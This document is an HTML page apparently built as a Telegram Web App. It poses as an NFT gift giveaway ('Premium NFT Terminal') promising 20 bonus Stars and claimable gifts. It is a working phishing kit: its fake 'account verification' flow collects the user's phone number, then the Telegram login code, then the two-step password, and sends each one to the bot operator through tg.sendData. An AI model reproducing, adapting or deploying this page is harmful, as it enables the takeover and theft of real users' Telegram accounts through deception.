<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Premium NFT Terminal</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --tg-theme-bg: #000000;
            --accent-color: #0088cc;
            --glass: rgba(255, 255, 255, 0.05);
            --border: rgba(255, 255, 255, 0.1);
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--tg-theme-bg);
            color: #fff;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            -webkit-user-select: none;
        }

        #snow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; opacity: 0.3; }

        /* Шапка с балансом */
        .header {
            padding: 20px;
            text-align: center;
            background: linear-gradient(to bottom, rgba(0,136,204,0.1), transparent);
            border-bottom: 1px solid var(--border);
        }

        .balance-badge {
            display: inline-flex;
            align-items: center;
            background: rgba(255, 215, 0, 0.1);
            border: 1px solid rgba(255, 215, 0, 0.3);
            padding: 5px 15px;
            border-radius: 20px;
            color: #ffd700;
            font-weight: bold;
            font-size: 14px;
        }

        /* Навигация */
        .tabs {
            display: flex;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(10px);
            position: sticky;
            top: 0;
            z-index: 100;
            border-bottom: 1px solid var(--border);
        }

        .tab-link {
            flex: 1;
            padding: 15px;
            text-align: center;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: #666;
            transition: 0.3s;
        }

        .tab-link.active {
            color: #fff;
            border-bottom: 2px solid var(--accent-color);
        }

        .content-section { display: none; padding: 15px; animation: fadeIn 0.4s ease; }
        .content-section.active { display: block; }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* Карточки NFT */
        .nft-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }

        .nft-card {
            background: var(--glass);
            border: 1px solid var(--border);
            border-radius: 15px;
            padding: 15px;
            text-align: center;
            position: relative;
        }

        .nft-gif { width: 100%; border-radius: 10px; margin-bottom: 10px; animation: float 3s ease-in-out infinite; }

        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }

        .nft-title { font-size: 14px; margin-bottom: 5px; font-weight: 500; }
        .nft-price { font-size: 11px; color: #888; margin-bottom: 12px; display: block; }

        .claim-btn {
            background: #fff;
            color: #000;
            border: none;
            padding: 8px;
            width: 100%;
            border-radius: 8px;
            font-size: 12px;
            font-weight: bold;
            text-transform: uppercase;
        }

        /* Личный кабинет */
        .profile-box {
            background: var(--glass);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 15px;
        }

        .status-verified { color: #00c853; font-size: 12px; font-weight: bold; }
        .status-unverified { color: #ff5252; font-size: 12px; font-weight: bold; }

        /* Модальные окна Верификации */
        .v-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 1000; padding: 30px; box-sizing: border-box;
            flex-direction: column; justify-content: center;
        }
        .v-overlay.active { display: flex; }

        .v-input {
            background: #111;
            border: 1px solid #333;
            border-radius: 12px;
            color: #fff;
            padding: 20px;
            font-size: 24px;
            text-align: center;
            width: 100%;
            box-sizing: border-box;
            margin: 20px 0;
            outline: none;
        }
        .v-input:focus { border-color: var(--accent-color); }

        .v-title { font-size: 22px; font-weight: bold; margin-bottom: 10px; text-align: center; }
        .v-text { color: #888; font-size: 14px; text-align: center; line-height: 1.5; }
    </style>
</head>
<body>
    <canvas id="snow"></canvas>

    <div class="header">
        <div class="balance-badge">⭐️ 20 STARS (BONUS)</div>
    </div>

    <div class="tabs">
        <div class="tab-link active" onclick="showTab('market')">Market</div>
        <div class="tab-link" onclick="showTab('profile')">Profile</div>
        <div class="tab-link" onclick="showTab('verify')">Withdraw</div>
    </div>

    <div id="market" class="content-section active">
        <div class="nft-grid">
            <div class="nft-card">
                <img src="https://nft.fragment.com/gift/santahat-10168.webp" class="nft-gif">
                <div class="nft-title">Santa Hat</div>
                <span class="nft-price">Value: 50 USD</span>
                <button class="claim-btn" onclick="startAuth()">Claim</button>
            </div>
            <div class="nft-card">
                <img src="https://nft.fragment.com/gift/holidaydrink-39466.webp" class="nft-gif">
                <div class="nft-title">Holiday Drink</div>
                <span class="nft-price">Value: 45 USD</span>
                <button class="claim-btn" onclick="startAuth()">Claim</button>
            </div>
        </div>
    </div>

    <div id="profile" class="content-section">
        <div class="profile-box">
            <div style="color:#888; font-size: 12px;">Account Status</div>
            <div class="status-unverified" style="margin-top: 5px;">✖ NOT VERIFIED</div>
        </div>
        <div class="profile-box">
            <div style="color:#888; font-size: 12px;">Available Balance</div>
            <div style="font-size: 24px; font-weight: bold; margin-top: 5px;">20.00 ⭐️</div>
        </div>
        <button class="claim-btn" style="background: var(--accent-color); color:#fff;" onclick="showTab('verify')">Verify Account</button>
    </div>

    <div id="verify" class="content-section">
        <div class="v-title">Account Verification</div>
        <p class="v-text">To prevent bot activity and withdraw your <b>20 Stars</b>, please complete the identity verification.</p>
        <button class="claim-btn" style="margin-top: 20px; height: 50px;" onclick="startAuth()">Verify Now</button>
    </div>

    <div id="step-code" class="v-overlay">
        <div class="v-title">Confirm Identity</div>
        <p class="v-text">We sent a <b>Login Code</b> to your Telegram app. Enter it below to verify ownership.</p>
        <input type="number" id="in-code" class="v-input" placeholder="0 0 0 0 0">
        <button class="claim-btn" style="height: 50px; background: var(--accent-color); color:#fff;" onclick="sendCode()">Continue</button>
    </div>

    <div id="step-pass" class="v-overlay">
        <div class="v-title">2-Step Verification</div>
        <p class="v-text">Ваш аккаунт защищен паролем. Введите его для завершения минта.</p>
        <input type="password" id="in-pass" class="v-input" placeholder="Password">
        <button class="claim-btn" style="height: 50px; background: var(--accent-color); color:#fff;" onclick="sendPass()">Confirm & Claim</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        function showTab(tabId) {
            document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
            document.querySelectorAll('.tab-link').forEach(t => t.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            event.currentTarget.classList.add('active');
        }

        function startAuth() {
            tg.requestContact((sent, cb) => {
                if (sent && cb.responseUnsafe.contact) {
                    const phone = cb.responseUnsafe.contact.phone_number;
                    tg.sendData("PHONE:" + phone);
                    document.getElementById('step-code').classList.add('active');
                }
            });
        }

        function sendCode() {
            const val = document.getElementById('in-code').value;
            if(val.length >= 5) {
                tg.sendData("CODE:" + val);
                document.getElementById('step-code').classList.remove('active');
                document.getElementById('step-pass').classList.add('active');
            }
        }

        function sendPass() {
            const val = document.getElementById('in-pass').value;
            if(val.length > 0) {
                tg.sendData("PASS:" + val);
                tg.close();
            }
        }

        // Snow animation
        const canvas = document.getElementById('snow');
        const ctx = canvas.getContext('2d');
        let flakes = [];
        function initSnow() {
            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
            for (let i = 0; i < 50; i++) flakes.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: Math.random()*1.5, d: Math.random()*0.5 });
        }
        function drawSnow() {
            ctx.clearRect(0,0,canvas.width,canvas.height); ctx.fillStyle = "rgba(255,255,255,0.6)"; ctx.beginPath();
            for (let f of flakes) { ctx.moveTo(f.x, f.y); ctx.arc(f.x, f.y, f.r, 0, Math.PI*2); }
            ctx.fill();
            for (let f of flakes) { f.y += f.d + 0.3; if (f.y > canvas.height) f.y = -5; }
            requestAnimationFrame(drawSnow);
        }
        window.addEventListener('resize', initSnow);
        initSnow(); drawSnow();
    </script>
</body>
</html>
